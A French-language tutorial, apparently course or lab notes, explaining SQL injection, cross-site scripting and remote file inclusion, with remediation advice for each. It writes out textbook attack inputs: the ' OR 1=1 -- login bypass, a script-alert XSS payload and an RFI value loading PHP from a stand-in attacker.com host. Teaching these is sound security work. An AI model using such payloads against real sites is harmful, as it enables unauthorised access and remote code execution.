```**********************************************************************************************************************************************```

# Low - Injection SQL (SQLi)
## Définition:
L'injection SQL permet à un attaquant d'insérer (ou "injecter") du code SQL malveillant dans une requête SQL. Cela peut permettre à l'attaquant de manipuler des bases de données pour exfiltrer des informations sensibles, modifier des données ou même prendre le contrôle de la base de données.
## Comment l'utiliser:
Si tu as une page qui prend des entrées utilisateur, comme un champ de connexion, tu peux essayer d'injecter une commande SQL malveillante. Par exemple, dans un champ de "username", tu peux essayer: ```' OR 1=1 --```
Cette chaîne contourne la vérification du mot de passe en rendant la condition toujours vraie.
## Solution :
- Utiliser des requêtes préparées avec des paramètres liés.
- Valider et filtrer toutes les entrées des utilisateurs.
- Utiliser des comptes avec des privilèges limités sur la base de données.

# Medium - Cross-Site Scripting (XSS)
## Définition:
Le Cross-Site Scripting (XSS) permet à un attaquant d'injecter du code JavaScript malveillant dans une page web, qui sera ensuite exécuté dans le navigateur des utilisateurs lorsqu'ils consultent la page.
## Exploitation:
Par exemple, un attaquant peut injecter ce code dans un champ de commentaire vulnérable sur un site web: ```<script>alert('XSS')</script>```
Cela affichera une alerte dans le navigateur de la victime.
## Solution :
- Encoder toutes les sorties des données utilisateurs (par exemple, utiliser htmlspecialchars() en PHP).
- Mettre en place une politique de sécurité du contenu (CSP) pour restreindre les scripts non autorisés.
- Valider et assainir les entrées utilisateur, notamment les champs de formulaire.

# High - Remote File Inclusion (RFI)
## Définition:
L'attaque Remote File Inclusion (RFI) permet à un attaquant d'inclure un fichier malveillant depuis une URL externe. Si un site permet l'inclusion de fichiers sans validation, un attaquant peut injecter un fichier PHP malveillant, entraînant souvent l'exécution de code sur le serveur.
## Exploitation:
Par exemple, si un site web utilise un paramètre comme include.php?file=page.txt, un attaquant pourrait injecter : ```http://attacker.com/malicious_file.php```
Cela chargerait un fichier PHP malveillant depuis un serveur externe.
## Solution :
- Désactiver l'option allow_url_include dans PHP.
- N'accepter que des fichiers locaux pour l'inclusion et les valider.
- Utiliser une liste blanche de fichiers autorisés à inclure.

```****************************************************************************************************************************************************```

# Comment exploiter ces vulnérabilités
## SQL Injection (SQLi)
1) Exploitation simple :
- Injecter une chaîne comme ' OR 1=1 -- dans un champ de formulaire comme username.
- Cela modifie la requête SQL pour que la condition 1=1 soit toujours vraie, contournant la vérification du mot de passe.
2) Exemple :
- Sur une page de connexion, l'attaquant entre :
    - username: ' OR 1=1 --
    - password: (vide)
- La requête SQL devient SELECT * FROM users WHERE username='' OR 1=1 --' AND password='', ce qui renvoie toujours un résultat.

## XSS (Cross-Site Scripting)
1) Exploitation simple :
- Injecter un script JavaScript malveillant dans un champ vulnérable (comme un commentaire), qui sera ensuite exécuté dans le navigateur de l'utilisateur.
2) Exemple :
- Dans un champ de commentaire, l'attaquant entre: ```<script>alert('XSS')</script>```
- Lorsque quelqu'un consulte la page, ce script est exécuté dans son navigateur, affichant l'alerte.

## RFI (Remote File Inclusion)
1) Exploitation simple :
- Si le site inclut des fichiers via un paramètre comme include.php?file=page.txt, l'attaquant peut soumettre une URL externe pointant vers un fichier PHP malveillant.
2) Exemple :
- Si le site permet l'inclusion de fichiers, l'attaquant pourrait soumettre : ```http://attacker.com/malicious_file.php```
- Cela chargerait un fichier PHP malveillant et l'exécuterait sur le serveur.

```****************************************************************************************************************************************************```

# Comment résoudre ces vulnérabilités
## SQL Injection (SQLi)
1) Utiliser des requêtes préparées et des paramètres liés pour éviter l'injection.
2) Valider et filtrer toutes les entrées des utilisateurs.
3) Donner des privilèges limités aux comptes de la base de données (par exemple, en lecture seule pour les requêtes publiques).

## XSS (Cross-Site Scripting)
1) Encoder toutes les sorties pour éviter que le JavaScript soit exécuté (par exemple, avec htmlspecialchars()).
2) Mettre en place une Content Security Policy (CSP) pour limiter les sources de scripts autorisés.
3) Valider et filtrer toutes les entrées utilisateur dans les formulaires et autres champs.

## RFI (Remote File Inclusion)
1) Désactiver allow_url_include dans PHP.
2) Valider soigneusement les fichiers acceptés pour inclusion (n'accepter que des fichiers locaux).
3) Utiliser une liste blanche des fichiers autorisés à être inclus.

```****************************************************************************************************************************************************```